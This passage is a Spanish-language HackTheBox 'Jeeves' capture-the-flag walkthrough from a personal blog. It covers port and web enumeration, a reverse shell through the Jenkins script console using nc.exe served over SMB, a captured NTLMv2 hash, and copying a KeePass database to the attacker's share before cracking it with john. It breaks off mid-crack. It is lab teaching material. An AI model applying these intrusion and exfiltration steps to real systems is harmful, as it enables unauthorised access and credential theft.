@@ -1,0 +1,1195 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Jeeves (medium) | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="HackTheBox - Jeeves (medium)" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html" />
+<meta property="og:url" content="http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-06-22T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="HackTheBox - Jeeves (medium)" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-06-22T00:00:00-06:00","datePublished":"2024-06-22T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"HackTheBox - Jeeves (medium)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html"},"url":"http://localhost:4000/hackthebox/machines/medium/2024/06/22/jeeves.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">HackTheBox - Jeeves (medium)</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-06-22T00:00:00-06:00" itemprop="datePublished">
+        Jun 22, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/709059a710d3d6ff1ba32bf0729ecbb8.png" />
+</p>
+
+<ul>
+  <li>Jeeves is not overly complicated, however it focuses on some interesting techniques and provides a great learning experience. As the use of alternate data streams is not very common, some users may have a hard time locating the correct escalation path.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.63
+PING 10.10.10.63 <span class="o">(</span>10.10.10.63<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.63: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>97.5 ms
+
+<span class="nt">---</span> 10.10.10.63 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 97.478/97.478/97.478/0.000 ms
+❯ whichSystem.py 10.10.10.63
+
+10.10.10.63 <span class="o">(</span>ttl -&gt; 127<span class="o">)</span>: Windows
+</code></pre></div></div>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li><a href="https://github.com/MikeRega7/nrunscan">nrunscan</a> esta es la herramienta que hice que te automatiza el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> por <strong>TCP</strong> por si quieres usarla.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,445,50000 10.10.10.63 <span class="nt">-oN</span> targeted
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-02 17:38 CST
+Nmap scan report <span class="k">for </span>10.10.10.63
+Host is up <span class="o">(</span>0.096s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE    SERVICE      VERSION
+80/tcp    open     http         Microsoft IIS httpd 10.0
+| http-methods:
+|_  Potentially risky methods: TRACE
+|_http-title: Ask Jeeves
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open     msrpc        Microsoft Windows RPC
+445/tcp   open     microsoft-ds Microsoft Windows 7 - 10 microsoft-ds <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+50000/tcp filtered ibm-db2
+Service Info: Host: JEEVES<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb-security-mode:
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
+| smb2-time:
+|   <span class="nb">date</span>: 2023-07-03T04:39:17
+|_  start_date: 2023-07-03T03:49:32
+|_clock-skew: mean: 4h59m59s, deviation: 0s, median: 4h59m58s
+| smb2-security-mode:
+|   311:
+|_    Message signing enabled but not required
+</code></pre></div></div>
+
+<h2 id="enumeración">Enumeración</h2>
+
+<ul>
+  <li>Bueno, el <code class="language-plaintext highlighter-rouge">crackmapexec</code> nos reporta que estamos ante un <strong>Windows 10 Pro</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ crackmapexec smb 10.10.10.63
+SMB         10.10.10.63     445    JEEVES           <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10 Pro 10586 x64 <span class="o">(</span>name:JEEVES<span class="o">)</span> <span class="o">(</span>domain:Jeeves<span class="o">)</span> <span class="o">(</span>signing:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a comenzar enumerando por <code class="language-plaintext highlighter-rouge">smb</code> para ver si encontramos recursos compartidos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbclient <span class="nt">-L</span> 10.10.10.63 <span class="nt">-N</span>
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<ul>
+  <li>Si comprobamos usando otras herramientas, vemos que no podemos enumerar por este puerto, ya que no tenemos credenciales y no podemos emplear un <strong>Null Session</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbmap <span class="nt">-H</span> 10.10.10.63
+<span class="o">[!]</span> Authentication error on 10.10.10.63
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ver las tecnologías que están corriendo en los puertos que tienen un servicio <code class="language-plaintext highlighter-rouge">http</code>.</li>
+</ul>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">❯</span> <span class="n">whatweb</span> <span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span>
+<span class="n">http</span><span class="ss">:/</span><span class="o">/</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span> <span class="p">[</span><span class="mi">200</span> <span class="no">OK</span><span class="p">]</span> <span class="no">Country</span><span class="p">[</span><span class="no">RESERVED</span><span class="p">][</span><span class="no">ZZ</span><span class="p">],</span> <span class="no">HTML5</span><span class="p">,</span> <span class="no">HTTPServer</span><span class="p">[</span><span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="o">/</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">IP</span><span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">10.63</span><span class="p">],</span> <span class="no">Microsoft</span><span class="o">-</span><span class="no">IIS</span><span class="p">[</span><span class="mf">10.0</span><span class="p">],</span> <span class="no">Title</span><span class="p">[</span><span class="no">Ask</span> <span class="no">Jeeves</span><span class="p">]</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Pues bueno, vamos a ver la página web.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web1.png" />
+</p>
+
+<ul>
+  <li>Bueno es la primera vez que veo eso si investigamos vemos que es un <strong>buscador</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web2.png" />
+</p>
+
+<ul>
+  <li>Bueno si investigamos de primeras si tiene vulnerabilidades como tal solo vemos una, pero no creo que este sea el caso, ya que esta máquina no contempla <strong>buffer overflow</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit jeeves
+<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                |  Path
+<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Ask.com/AskJeeves Toolbar Toolbar 4.0.2.53 - ActiveX Remote Buffer Overflow                   | windows/remote/4452.html
+<span class="nt">----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a buscar algo en el navegador para probarlo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web3.png" />
+</p>
+
+<ul>
+  <li>Pero bueno nos redirige a <code class="language-plaintext highlighter-rouge">error.html?</code> y bueno ya nos están dando información sobre el error.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web4.png" />
+</p>
+
+<ul>
+  <li>Vamos a comenzar aplicando <strong>Fuzzing</strong> para ver si encontramos más rutas de la máquina.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ feroxbuster <span class="nt">-t</span> 200 <span class="nt">-x</span> php,txt,html <span class="nt">-u</span> http://10.10.10.63
+
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__<span class="o">)</span> |__<span class="o">)</span> | /  <span class="sb">`</span>    /  <span class="se">\ \_</span>/ | |  <span class="se">\ </span>|__
+|    |___ |  <span class="se">\ </span>|  <span class="se">\ </span>| <span class="se">\_</span>_,    <span class="se">\_</span>_/ / <span class="se">\ </span>| |__/ |___
+by Ben <span class="s2">"epi"</span> Risher 🤓                 ver: 2.3.3
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.10.10.63
+ 🚀  Threads               │ 200
+ 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+ 👌  Status Codes          │ <span class="o">[</span>200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
+ 💥  Timeout <span class="o">(</span>secs<span class="o">)</span>        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.3.3
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 💲  Extensions            │ <span class="o">[</span>php, txt, html]
+ 🔃  Recursion Depth       │ 4
+ 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
+───────────────────────────┴──────────────────────
+ 🏁  Press <span class="o">[</span>ENTER] to use the Scan Cancel Menu™
+──────────────────────────────────────────────────
+200        1l        4w       50c http://10.10.10.63/error.html
+200       17l       40w      503c http://10.10.10.63/index.html
+200        1l        4w       50c http://10.10.10.63/Error.html
+200       17l       40w      503c http://10.10.10.63/Index.html
+<span class="o">[</span><span class="c">####################] - 1m    119996/119996  0s      found:4       errors:0</span>
+<span class="o">[</span><span class="c">####################] - 1m    119996/119996  1741/s  http://10.10.10.63</span>
+</code></pre></div></div>
+
+<h2 id="enumeración-50000">Enumeración 50000</h2>
+
+<ul>
+  <li>
+    <p>Bueno si analizamos el escaneo de <code class="language-plaintext highlighter-rouge">nmap</code> vemos que también está el puerto <code class="language-plaintext highlighter-rouge">50000</code> vamos a ver que hay, ya que nos dicen <strong>Service Info</strong>.</p>
+  </li>
+  <li>
+    <p>Volví a escanear el puerto y si está abierto.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p50000</span> 10.10.10.63 <span class="nt">-oN</span> targe2
+Starting Nmap 7.93 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-07-02 18:03 CST
+Nmap scan report <span class="k">for </span>10.10.10.63
+Host is up <span class="o">(</span>0.093s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE VERSION
+50000/tcp open  http    Jetty 9.4.z-SNAPSHOT
+|_http-title: Error 404 Not Found
+|_http-server-header: Jetty<span class="o">(</span>9.4.z-SNAPSHOT<span class="o">)</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>25.07 seconds
+</code></pre></div></div>
+
+<ul>
+  <li>Esto es lo que hay.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web5.png" />
+</p>
+
+<ul>
+  <li>Pero no encontramos nada vamos a aplicar <strong>Fuzzing</strong> pero ahora para este puerto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.63:50000 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-t</span> 50 <span class="nt">-x</span> txt,php,html <span class="nt">--no-error</span>
+<span class="o">===============================================================</span>
+Gobuster v3.1.0
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@firefart<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:                     http://10.10.10.63:50000
+<span class="o">[</span>+] Method:                  GET
+<span class="o">[</span>+] Threads:                 50
+<span class="o">[</span>+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Negative Status codes:   404
+<span class="o">[</span>+] User Agent:              gobuster/3.1.0
+<span class="o">[</span>+] Extensions:              txt,php,html
+<span class="o">[</span>+] Timeout:                 10s
+<span class="o">===============================================================</span>
+2023/07/02 18:07:16 Starting gobuster <span class="k">in </span>directory enumeration mode
+<span class="o">===============================================================</span>
+/askjeeves            <span class="o">(</span>Status: 302<span class="o">)</span> <span class="o">[</span>Size: 0] <span class="o">[</span><span class="nt">--</span><span class="o">&gt;</span> http://10.10.10.63:50000/askjeeves/]
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno nos redirige a un <strong>Jenkins</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web6.png" />
+</p>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web7.png" />
+</p>
+
+<ul>
+  <li>Bueno vemos que esto está activado.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web8.png" />
+</p>
+
+<ul>
+  <li>Bueno vemos que podemos ejecutar comandos en <strong>Groovy</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web9.png" />
+</p>
+
+<ul>
+  <li>Si buscamos como podemos ejecutar algún comando encontramos lo siguiente.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web10.png" />
+</p>
+
+<ul>
+  <li>Vamos a probarlo.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web11.png" />
+</p>
+
+<ul>
+  <li>Y bueno funciona.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web12.png" />
+</p>
+
+<ul>
+  <li>Bueno ahora lo que podemos hacer es asegurarnos de que si ganamos acceso al sistema ganar acceso ala máquina real y no a un contenedor para eso vamos a ejecutar el siguiente comando.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web13.png" />
+</p>
+
+<h2 id="shell-as-kohsuke">Shell as kohsuke</h2>
+
+<ul>
+  <li>Bueno para ganar acceso vamos a necesitar <code class="language-plaintext highlighter-rouge">nc.exe</code> si tienes <code class="language-plaintext highlighter-rouge">seclists</code> clonado o instalado ya te viene el <code class="language-plaintext highlighter-rouge">nc.exe</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ locate nc.exe
+/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
+❯ <span class="nb">cp</span> /usr/share/seclists/Web-Shells/FuzzDB/nc.exe <span class="nb">.</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a usar <code class="language-plaintext highlighter-rouge">smbserver.py</code> o <code class="language-plaintext highlighter-rouge">impacket-smbserver</code> para ofrecer el <code class="language-plaintext highlighter-rouge">nc.exe</code> es importante que lo ejecutes en la ruta donde se encuentre el <strong>nc.exe</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a ponernos en escucha para directamente enviarnos una <code class="language-plaintext highlighter-rouge">reverse shell</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+Listening on 0.0.0.0 443
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno vamos a escapar las barras para que no entre en conflicto vamos a darle a <strong>Execute</strong>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web14.png" />
+</p>
+
+<ul>
+  <li>Y ganamos acceso además tenemos un <strong>Hash</strong> <code class="language-plaintext highlighter-rouge">NTLMV2</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ smbserver.py parrotsec <span class="nb">.</span> <span class="nt">-smb2support</span>
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Callback added <span class="k">for </span>UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Config file parsed
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Incoming connection <span class="o">(</span>10.10.10.63,49678<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span>JEEVES<span class="se">\k</span>ohsuke,JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\k</span>ohsuke authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> kohsuke::JEEVES:aaaaaaaaaaaaaaaa:c23a012c38f0f7005de8ee2b9a5c45c4:010100000000000000f5b20e48add901859a5b91331600a700000000010010004c0058006f0072007a0078004c004b00030010004c0058006f0072007a0078004c004b00020010005a0042005700500078004c006c004400040010005a0042005700500078004c006c0044000700080000f5b20e48add90106000400020000000800300030000000000000000000000000300000ecd30e6e2741e888fe19c320d42d3424341eac95c921e6f32cf839ae34398fa60a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e0031003200000000000000000000000000
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>1:IPC<span class="nv">$)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting Share<span class="o">(</span>2:parrotsec<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> AUTHENTICATE_MESSAGE <span class="o">(</span><span class="se">\,</span>JEEVES<span class="o">)</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> User JEEVES<span class="se">\ </span>authenticated successfully
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> :::00::aaaaaaaaaaaaaaaa
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rlwrap nc <span class="nt">-lvnp</span> 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.10.63 49679
+Microsoft Windows <span class="o">[</span>Version 10.0.10586]
+<span class="o">(</span>c<span class="o">)</span> 2015 Microsoft Corporation. All rights reserved.
+
+C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\.</span>jenkins&gt;
+</code></pre></div></div>
+
+<h2 id="usertxt">User.txt</h2>
+
+<ul>
+  <li>Si nos vamos ala <strong>raiz</strong> <code class="language-plaintext highlighter-rouge">C:\</code> vemos que hay está la <code class="language-plaintext highlighter-rouge">user.txt</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir</span> /r /s user.txt
+ Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop
+
+11/03/2017  11:22 PM                32 user.txt
+               1 File<span class="o">(</span>s<span class="o">)</span>             32 bytes
+
+     Total Files Listed:
+               1 File<span class="o">(</span>s<span class="o">)</span>             32 bytes
+               0 Dir<span class="o">(</span>s<span class="o">)</span>   2,408,325,120 bytes free
+
+C:<span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">type </span>user.txt
+e3232272596fb47950d59c4cf1e7066a
+C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>esktop&gt;
+</code></pre></div></div>
+
+<h2 id="escalada-de-privilegios">Escalada de Privilegios</h2>
+
+<ul>
+  <li>Si vamos un directorio hacia atrás vemos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">dir
+ </span>Volume <span class="k">in </span>drive C has no label.
+ Volume Serial Number is 71A1-6FA1
+
+ Directory of C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments
+
+11/03/2017  11:18 PM    &lt;DIR&gt;          <span class="nb">.</span>
+11/03/2017  11:18 PM    &lt;DIR&gt;          ..
+09/18/2017  01:43 PM             2,846 CEH.kdbx
+               1 File<span class="o">(</span>s<span class="o">)</span>          2,846 bytes
+               2 Dir<span class="o">(</span>s<span class="o">)</span>   2,408,325,120 bytes free
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Esto corresponde al <code class="language-plaintext highlighter-rouge">KeePass</code>.</li>
+</ul>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web15.png" />
+</p>
+
+<ul>
+  <li>Vamos a traernos eso a nuestra máquina de atacante usando el recurso compartido a nivel de red con <code class="language-plaintext highlighter-rouge">smbclient.py</code> que ya tenemos.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>copy CEH.kdbx <span class="se">\\</span>10.10.14.12<span class="se">\p</span>arrotsec<span class="se">\C</span>EH.kdbx
+        1 file<span class="o">(</span>s<span class="o">)</span> copied.
+
+C:<span class="se">\U</span>sers<span class="se">\k</span>ohsuke<span class="se">\D</span>ocuments&gt;
+</code></pre></div></div>
+
+<ul>
+  <li>Y tenemos el archivo.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">ls</span>
+ CEH.kdbx   nc.exe
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a abrirlo lo más probable es que necesitemos una contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ keepassxc CEH.kdbx &amp; <span class="nb">disown</span>
+<span class="o">[</span>1] 197209
+</code></pre></div></div>
+
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/jeeves/web16.png" />
+</p>
+
+<ul>
+  <li>Como no sabemos la contraseña algo que podemos hacer es usar <code class="language-plaintext highlighter-rouge">keepass2john</code>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ keepass2john CEH.kdbx <span class="o">&gt;</span> <span class="nb">hash</span>
+❯ catn <span class="nb">hash
+</span>CEH:<span class="nv">$keepass$*</span>2<span class="k">*</span>6000<span class="k">*</span>0<span class="k">*</span>1af405cc00f979ddb9bb387c4594fcea2fd01a6a0757c000e1873f3c71941d3d<span class="k">*</span>3869fe357ff2d7db1555cc668d1d606b1dfaf02b9dba2621cbe9ecb63c7a4091<span class="k">*</span>393c97beafd8a820db9142a6a94f03f6<span class="k">*</span>b73766b61e656351c3aca0282f1617511031f0156089b6c5647de4671972fcff<span class="k">*</span>cb409dbc0fa660fcffa4f1cc89f728b68254db431a21ec33298b612fe647db48
+</code></pre></div></div>
+
+<ul>
+  <li>Y bueno tenemos la contraseña.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ john <span class="nt">-w</span>:/usr/share/wordlists/rockyou.txt <span class="nb">hash
+</span>Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>KeePass <span class="o">[</span>SHA256 AES 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 6000 <span class="k">for </span>all loaded hashes
